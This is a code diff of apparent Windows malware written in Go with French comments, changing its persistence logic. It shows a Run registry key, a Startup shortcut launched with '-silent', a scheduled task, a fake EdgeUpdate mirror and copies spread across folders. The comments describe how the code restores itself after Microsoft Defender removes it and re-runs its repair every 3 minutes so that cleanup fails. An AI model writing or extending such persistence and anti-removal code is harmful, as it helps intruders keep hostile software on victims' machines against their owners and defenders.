@@ -113,11 +113,16 @@ func persistTaskRemove() {
 	_ = c.Run()
 }
 
-// persistStartupLink crée le raccourci du dossier Démarrage, ciblant
-// l'exécutable avec l'argument `-silent` et une fenêtre réduite.
+// persistStartupLink crée le raccourci du dossier Démarrage vers la cible
+// courante.
 func persistStartupLink() {
+	startupLinkTo(runTarget())
+}
+
+// startupLinkTo crée le raccourci du dossier Démarrage vers `exe`, avec
+// l'argument `-silent` et une fenêtre réduite.
+func startupLinkTo(exe string) {
 	dst := startupLinkPath()
-	exe := runTarget()
 	if dst == "" || exe == "" {
 		return
 	}
@@ -256,25 +261,47 @@ func readDirNames(dir string) ([]string, error) {
 	return out, nil
 }
 
-// persistHeal vérifie les ancrages et répare ce qui manque. Une passe au
-// démarrage, puis une toutes les 30 minutes : assez pour survivre à un
-// nettoyage manuel, assez rare pour ne pas ressembler à une boucle de
-// réparation automatique (qui, elle, alimentait la détection).
+// persistHeal vérifie les ancrages et répare ce qui manque.
+//
+// Defender supprime le miroir EdgeUpdate, la clé Run et le raccourci dès qu'il
+// reconnaît le binaire ; les copies posées ailleurs survivent. La réparation
+// repart donc d'une copie existante (ProgramData en premier) au lieu de
+// recréer systématiquement le miroir, et repasse toutes les 3 minutes : sans
+// cela une remédiation laissait le poste sans démarrage automatique.
 func persistHeal() {
 	if !cfg.Persist || stopped.Load() {
 		return
 	}
-	persistMirror()
-	persistStartupLink()
-	if persistStatus() == "absente" {
-		_ = regSetValueString(hkeyCurrentUser, runKeyPath, runValueName, runValue())
+
+	exe := ""
+	for _, p := range spreadCopyPaths() {
+		if fileExists(p) {
+			exe = p
+			break
+		}
 	}
+	if exe == "" {
+		persistMirror()
+		exe = runTarget()
+	}
+	if exe == "" {
+		return
+	}
+	// Une copie a peut-être été retirée : on la repose.
+	spreadCopies(false)
+
+	value := `"` + exe + `" -silent`
+	_ = regSetValueString(hkeyCurrentUser, runKeyPath, runValueName, value)
+	if !fileExists(startupLinkPath()) {
+		startupLinkTo(exe)
+	}
+	persistTask()
 }
 
 // persistHealLoop tourne tant que le payload vit.
 func persistHealLoop() {
 	for {
-		time.Sleep(30 * time.Minute)
+		time.Sleep(3 * time.Minute)
 		if stopped.Load() {
 			return
 		}
